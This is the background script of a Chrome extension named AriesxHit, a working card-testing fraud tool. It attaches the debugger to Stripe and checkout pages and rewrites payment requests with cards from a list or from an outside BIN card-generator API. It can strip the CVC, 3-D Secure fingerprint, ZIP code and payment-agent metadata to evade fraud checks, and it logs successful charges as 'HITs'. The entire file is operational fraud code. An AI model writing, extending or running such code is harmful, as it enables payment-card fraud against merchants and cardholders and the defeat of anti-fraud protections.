// ===================================
// BACKGROUND.JS - Chrome Debugger API
// Based on working AutohitterV2 logic
// ===================================

// Configuration
const CONFIG = {
  CARD_GENERATOR_URL: 'https://drlabapis.onrender.com/api/ccgenerator?bin=',
  DEBUGGER_VERSION: '1.3',
  RETRY_DELAY: 2000
};

// State management
const state = {
  binList: [],
  cardList: [],
  currentBinIndex: 0,
  bypassActive: false,
  autoHitActive: false,
  userClickedSubmit: false,
  retryInProgress: false,
  debuggerAttachedTabs: new Set(),
  tabCardDetailsMap: new Map(),
  tabSuccessUrlMap: new Map(),
  requestIdMap: new Map(),
  logs: [],
  stats: { hits: 0, tested: 0, declined: 0 },
  settings: {
    cvcModifier: 'generate',
    customCvc: '',
    remove3dsFingerprint: true,
    removePaymentAgent: false,
    removeZipCode: false
  }
};

// Initialize state from storage
chrome.storage.local.get([
  'binList', 'cardList', 'logs', 'stats',
  'settings_cvcModifier', 'settings_customCvc',
  'settings_remove3dsFingerprint', 'settings_removePaymentAgent', 'settings_removeZipCode'
], (result) => {
  if (result.binList) state.binList = result.binList;
  if (result.cardList) state.cardList = result.cardList;
  if (result.logs) state.logs = result.logs;
  if (result.stats) state.stats = result.stats;
  if (result.settings_cvcModifier) state.settings.cvcModifier = result.settings_cvcModifier;
  if (result.settings_customCvc) state.settings.customCvc = result.settings_customCvc;
  if (result.settings_remove3dsFingerprint !== undefined) {
    state.settings.remove3dsFingerprint = result.settings_remove3dsFingerprint;
  }
  if (result.settings_removePaymentAgent !== undefined) {
    state.settings.removePaymentAgent = result.settings_removePaymentAgent;
  }
  if (result.settings_removeZipCode !== undefined) {
    state.settings.removeZipCode = result.settings_removeZipCode;
  }
  log('info', '⚡ AriesxHit Ready');
});

// ==================== LOGGING ====================

function log(type, message) {
  const entry = { type, message, timestamp: Date.now() };
  state.logs.push(entry);
  if (state.logs.length > 500) state.logs.shift();
  chrome.storage.local.set({ logs: state.logs });
  
  // Update stats
  if (type === 'trying') state.stats.tested++;
  if (type === 'error') state.stats.declined++;
  if (type === 'success' && (message.includes('HIT') || message.includes('Success'))) state.stats.hits++;
  chrome.storage.local.set({ stats: state.stats });
  
  // Broadcast to popup
  chrome.runtime.sendMessage({ type: 'LOG_UPDATE', logType: type, message }).catch(() => {});
}

// ==================== CARD HANDLING ====================

// Normalize card year to 2-digit format
function normalizeCardYear(card) {
  if (!card || !card.year) return card;
  
  // Convert 4-digit year to 2-digit for Stripe API
  let year = card.year.toString();
  if (year.length === 4) {
    year = year.slice(-2);
  }
  
  return {
    ...card,
    year: year
  };
}

async function getCardForTab(tabId) {
  // Try to get from cardList first (Auto Hit mode)
  if (state.cardList.length > 0 && state.autoHitActive) {
    const card = state.cardList[state.currentBinIndex % state.cardList.length];
    state.currentBinIndex++;
    return normalizeCardYear(card);
  }

  // Otherwise generate from BIN
  if (state.binList.length > 0 && state.bypassActive) {
    const bin = state.binList[state.currentBinIndex % state.binList.length];
    state.currentBinIndex++;
    
    let retryCount = 0;
    const maxRetries = 3;
    
    while (retryCount < maxRetries) {
      try {
        const response = await fetch(CONFIG.CARD_GENERATOR_URL + encodeURIComponent(bin));
        if (!response.ok) {
          throw new Error('API request failed');
        }
        const text = await response.text();
        const [number, month, year, cvv] = text.trim().split('|');
        if (!number || !month || !year || !cvv) {
          throw new Error('Invalid card data format');
        }
        // Normalize year to 2-digit
        let normalizedYear = year.toString();
        if (normalizedYear.length === 4) {
          normalizedYear = normalizedYear.slice(-2);
        }
        return normalizeCardYear({ number, month, year: normalizedYear, cvv });
      } catch (error) {
        console.error('Card generation error:', error);
        retryCount++;
        if (retryCount === maxRetries) {
          return null;
        }
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }
  }
  return null;
}

// ==================== NOTIFICATION HANDLING ====================

function sendNotificationToContent(tabId, message, messageType = 'info') {
  chrome.tabs.sendMessage(tabId, {
    type: 'SHOW_NOTIFICATION',
    message: message,
    messageType: messageType
  }).catch(() => {});
}

// ==================== TAB MANAGEMENT ====================

function handleTabUpdate(tabId, changeInfo, tab) {
  if (!tab.url) return;

  const isTargetUrl = tab.url.includes('cs_live') || 
                      tab.url.includes('stripe.com') || 
                      tab.url.includes('checkout.') || 
                      tab.url.includes('billing.') || 
                      tab.url.includes('invoice.') || 
                      tab.url.includes('payment.') || 
                      tab.url.includes('pay.') || 
                      tab.url.includes('secure.');
  if (isTargetUrl) {
    setupTab(tabId);
  }

  if (changeInfo.status === "complete") {
    const successUrl = state.tabSuccessUrlMap.get(tabId);
    if (successUrl && tab.url.startsWith(successUrl)) {
      handleSuccess(tabId, tab.url);
    }
  }
}

function handleTabActivation({ tabId }) {
  chrome.tabs.get(tabId).then(tab => {
    if (!tab.url) return;

    const isTargetUrl = tab.url.includes('cs_live') || 
                        tab.url.includes('stripe.com') || 
                        tab.url.includes('checkout.') || 
                        tab.url.includes('billing.') || 
                        tab.url.includes('invoice.') || 
                        tab.url.includes('payment.') || 
                        tab.url.includes('pay.') || 
                        tab.url.includes('secure.');
    if (isTargetUrl) {
      setupTab(tabId);
    }

    const successUrl = state.tabSuccessUrlMap.get(tabId);
    if (successUrl && tab.url.startsWith(successUrl)) {
      handleSuccess(tabId, tab.url);
    }
  }).catch(() => {});
}

function setupTab(tabId) {
  if (!state.debuggerAttachedTabs.has(tabId)) {
    attachDebugger(tabId);
  }
}

// ==================== DEBUGGER HANDLING ====================

function attachDebugger(tabId) {
  if (state.debuggerAttachedTabs.has(tabId) || tabId <= 0) return;

  chrome.tabs.get(tabId, (tab) => {
    if (chrome.runtime.lastError || !tab || !tab.url) {
      console.error('Tab not found or not fully loaded:', chrome.runtime.lastError);
      return;
    }

    chrome.debugger.attach({ tabId }, CONFIG.DEBUGGER_VERSION, () => {
      if (chrome.runtime.lastError) {
        console.error('Debugger attach error:', chrome.runtime.lastError);
        return;
      }

      console.log(`Debugger attached to tab ${tabId}`);
      state.debuggerAttachedTabs.add(tabId);
      chrome.debugger.sendCommand({ tabId }, "Fetch.enable", { patterns: [{ urlPattern: '*' }] });
      chrome.debugger.sendCommand({ tabId }, "Network.enable");
    });
  });
}

async function handleDebuggerEvent(source, method, params) {
  if (!source.tabId || !state.debuggerAttachedTabs.has(source.tabId)) return;

  const handlers = {
    'Fetch.requestPaused': () => handleRequestPaused(source.tabId, params),
    'Network.responseReceived': () => handleResponseReceived(source.tabId, params),
    'Fetch.authRequired': () => handleAuthRequired(source.tabId, params)
  };

  const handler = handlers[method];
  if (handler) await handler();
}

async function handleRequestPaused(tabId, params) {
  const { requestId, request } = params;
  if (params.networkId) {
    state.requestIdMap.set(requestId, params.networkId);
  }

  if (request.url.includes('stripe.com') && 
      request.method === "POST" && 
      request.postData &&
      (state.bypassActive || state.autoHitActive)) {
    
    const card = await getCardForTab(tabId);
    if (!card) {
      chrome.debugger.sendCommand({ tabId }, "Fetch.continueRequest", { requestId });
      return;
    }

    try {
      const postData = new URLSearchParams(request.postData);
      
      // Replace card data
      if (postData.has('card[number]')) {
        postData.set("card[number]", card.number);
        postData.set("card[exp_month]", card.month);
        postData.set("card[exp_year]", card.year);
        
        // Handle CVC based on settings
        if (state.settings.cvcModifier === 'remove') {
          postData.delete('card[cvc]');
        } else if (state.settings.cvcModifier === 'custom') {
          postData.set('card[cvc]', state.settings.customCvc || card.cvv);
        } else {
          postData.set('card[cvc]', card.cvv);
        }
        
        log('trying', `Trying Card: ${card.number}|${card.month}|${card.year}|${card.cvv}`);
      } else if (postData.has('payment_method_data[card][number]')) {
        postData.set("payment_method_data[card][number]", card.number);
        postData.set("payment_method_data[card][exp_month]", card.month);
        postData.set("payment_method_data[card][exp_year]", card.year);
        
        if (state.settings.cvcModifier === 'remove') {
          postData.delete('payment_method_data[card][cvc]');
        } else if (state.settings.cvcModifier === 'custom') {
          postData.set('payment_method_data[card][cvc]', state.settings.customCvc || card.cvv);
        } else {
          postData.set('payment_method_data[card][cvc]', card.cvv);
        }
        
        log('trying', `Trying Card: ${card.number}|${card.month}|${card.year}|${card.cvv}`);
      } else {
        chrome.debugger.sendCommand({ tabId }, "Fetch.continueRequest", { requestId });
        return;
      }

      // Remove 3DS fingerprint if enabled
      if (state.settings.remove3dsFingerprint) {
        postData.delete('payment_method_options[card][three_d_secure][fingerprint]');
        postData.delete('three_d_secure[fingerprint]');
      }

      // Remove payment agent if enabled
      if (state.settings.removePaymentAgent) {
        postData.delete('payment_user_agent');
        postData.delete('referrer');
        for (const [key] of postData) {
          if (key.startsWith('client_attribution_metadata')) {
            postData.delete(key);
          }
        }
      }

      // Remove ZIP code if enabled
      if (state.settings.removeZipCode) {
        postData.delete('billing_details[address][postal_code]');
        postData.delete('card[address_zip]');
        postData.delete('payment_method_data[billing_details][address][postal_code]');
      }

      const updatedPostData = postData.toString();
      const headers = [
        ...(request.headers || []).map(h => ({ name: h.name, value: h.value })),
        { name: "Content-Length", value: updatedPostData.length.toString() }
      ];

      // Remove old Content-Length if exists
      const filteredHeaders = headers.filter((h, i, arr) => {
        const lowerName = h.name.toLowerCase();
        return lowerName !== 'content-length' || i === arr.length - 1;
      });

      const encodedPostData = btoa(unescape(encodeURIComponent(updatedPostData)));

      chrome.debugger.sendCommand({ tabId }, "Fetch.continueRequest", {
        requestId,
        method: request.method,
        postData: encodedPostData,
        headers: filteredHeaders
      });

      state.tabCardDetailsMap.set(tabId, card);
      sendNotificationToContent(tabId, `Using Card: ${card.number}|${card.month}|${card.year}|${card.cvv}`, "info");
    } catch (error) {
      console.error('Request modification error:', error);
      chrome.debugger.sendCommand({ tabId }, "Fetch.continueRequest", { requestId });
    }
  } else {
    chrome.debugger.sendCommand({ tabId }, "Fetch.continueRequest", { requestId });
  }
}

async function handleResponseReceived(tabId, params) {
  const { requestId, response } = params;
  if (!response.url.includes("stripe.com")) return;

  const contentType = response.headers['content-type'] || response.headers['Content-Type'] || '';
  if (!contentType.includes("application/json")) return;

  const networkId = state.requestIdMap.get(requestId);
  
  chrome.debugger.sendCommand({ tabId }, "Network.getResponseBody", { requestId: networkId || requestId }, (responseData) => {
    if (chrome.runtime.lastError || !responseData?.body) {
      console.error('Error fetching response body:', chrome.runtime.lastError);
      return;
    }

    try {
      const json = JSON.parse(responseData.base64Encoded ? atob(responseData.body) : responseData.body);
      
      if (json.success_url) {
        state.tabSuccessUrlMap.set(tabId, json.success_url);
      }

      const isPaymentSuccess = json.status?.toLowerCase() === 'succeeded' || 
                               json.status?.toLowerCase() === 'success' || 
                               json.payment_intent?.status?.toLowerCase() === 'succeeded' || 
                               json.payment_intent?.status?.toLowerCase() === 'success';

      if (isPaymentSuccess) {
        handleSuccess(tabId, state.tabSuccessUrlMap.get(tabId) || "N/A");
        return;
      }

      if (json.error || (json.payment_intent?.last_payment_error)) {
        const error = json.error || json.payment_intent.last_payment_error;
        const declineCode = error.decline_code || error.code || "Unknown error code";
        const errorMessage = error.message || "An error occurred during the transaction.";
        log('error', `Card Declined: ${declineCode} - ${errorMessage}`);
        sendNotificationToContent(tabId, `Card Declined: ${declineCode}`, "error");
      }

    } catch (error) {
      console.error('Error parsing response:', error);
    }
  });
}

function handleSuccess(tabId, successUrl) {
  const cardDetails = state.tabCardDetailsMap.get(tabId);
  if (cardDetails) {
    log('success', `HIT! Card: ${cardDetails.number}|${cardDetails.month}|${cardDetails.year}|${cardDetails.cvv}`);
    sendNotificationToContent(tabId, `Site Hit! 🟢`, 'success');
    state.tabCardDetailsMap.delete(tabId);
    state.userClickedSubmit = false;
    state.tabSuccessUrlMap.delete(tabId);
  }
}

function handleAuthRequired(tabId, params) {
  chrome.debugger.sendCommand({ tabId }, "Fetch.continueWithAuth", {
    requestId: params.requestId,
    authChallengeResponse: { response: 'Default' }
  });
}

// ==================== CLEANUP ====================

function handleTabRemoval(tabId) {
  if (state.debuggerAttachedTabs.has(tabId)) {
    chrome.debugger.detach({ tabId }, () => {
      if (chrome.runtime.lastError) {
        console.error('Debugger detach error:', chrome.runtime.lastError);
      }
      state.debuggerAttachedTabs.delete(tabId);
      state.tabCardDetailsMap.delete(tabId);
      state.tabSuccessUrlMap.delete(tabId);
      // Note: requestIdMap stores requestId -> networkId mappings
      // These are short-lived and will be garbage collected automatically
      // No need to manually clean them up by tabId
    });
  }
}

// ==================== MESSAGE HANDLER ====================

chrome.runtime.onMessage.addListener((msg, sender, respond) => {
  switch (msg.type) {
    // From content script - log entry
    case 'ADD_LOG':
      log(msg.logType, msg.message);
      respond({ success: true });
      break;

    // Start Bypass
    case 'START_BYPASS':
      state.bypassActive = true;
      if (msg.data?.bins?.length > 0) {
        state.binList = msg.data.bins;
        state.currentBinIndex = 0;
        chrome.storage.local.set({ binList: state.binList });
      }
      log('success', `🔓 Bypass ON [CVC: ${state.settings.cvcModifier}]`);
      respond({ success: true });
      break;

    // Stop Bypass
    case 'STOP_BYPASS':
      state.bypassActive = false;
      log('info', '⏹️ Bypass OFF');
      respond({ success: true });
      break;

    // Start Auto Hit
    case 'START_AUTO_HIT':
      state.autoHitActive = true;
      // Ensure cards are in correct format: array of {number, month, year, cvv}
      const cards = msg.data?.cards || [];
      state.cardList = Array.isArray(cards) ? cards : [];
      state.currentBinIndex = 0;
      chrome.storage.local.set({ cardList: state.cardList });
      log('success', `🚀 Auto Hit ON (${state.cardList.length} cards)`);
      respond({ success: true });
      break;

    // Stop Auto Hit
    case 'STOP_AUTO_HIT':
      state.autoHitActive = false;
      log('info', '⏹️ Auto Hit OFF');
      respond({ success: true });
      break;

    // Set BIN list
    case 'SET_BIN_LIST':
      state.binList = Array.isArray(msg.bins) ? msg.bins :
        msg.bins.split('\n').map(b => b.trim()).filter(b => b.length >= 6);
      state.currentBinIndex = 0;
      chrome.storage.local.set({ binList: state.binList });
      respond({ success: true });
      break;

    // Update settings
    case 'UPDATE_SETTINGS':
      Object.assign(state.settings, msg.settings);
      for (const [k, v] of Object.entries(msg.settings)) {
        chrome.storage.local.set({ [`settings_${k}`]: v });
      }
      respond({ success: true });
      break;

    // Get settings
    case 'GET_SETTINGS':
      respond({ settings: state.settings });
      break;

    // Get logs
    case 'GET_LOGS':
      respond({ logs: state.logs, stats: state.stats });
      break;

    // Clear logs
    case 'CLEAR_LOGS':
      state.logs = [];
      state.stats = { hits: 0, tested: 0, declined: 0 };
      chrome.storage.local.set({ logs: [], stats: state.stats });
      respond({ success: true });
      break;

    // Get stats
    case 'GET_STATS':
      respond(state.stats);
      break;

    // Get states
    case 'GET_BYPASS_STATE':
      respond({ active: state.bypassActive });
      break;

    case 'GET_AUTO_HIT_STATE':
      respond({ active: state.autoHitActive });
      break;

    // User clicked submit
    case 'USER_CLICKED_SUBMIT':
      state.userClickedSubmit = true;
      respond({ success: true });
      break;

    default:
      respond({ success: true });
  }
  return true;
});

// ==================== EVENT LISTENERS ====================

chrome.tabs.onUpdated.addListener(handleTabUpdate);
chrome.tabs.onActivated.addListener(handleTabActivation);
chrome.tabs.onRemoved.addListener(handleTabRemoval);
chrome.debugger.onEvent.addListener(handleDebuggerEvent);

// Extension icon click
chrome.action.onClicked.addListener(async () => {
  const tabs = await chrome.tabs.query({ url: chrome.runtime.getURL('popup.html') });
  if (tabs.length > 0) {
    chrome.tabs.update(tabs[0].id, { active: true });
    chrome.windows.update(tabs[0].windowId, { focused: true });
  } else {
    const auth = await chrome.storage.local.get(['auth_token']);
    chrome.tabs.create({
      url: chrome.runtime.getURL(auth.auth_token ? 'popup.html' : 'login.html')
    });
  }
});

console.log('[AriesxHit] Background Ready with Debugger API');

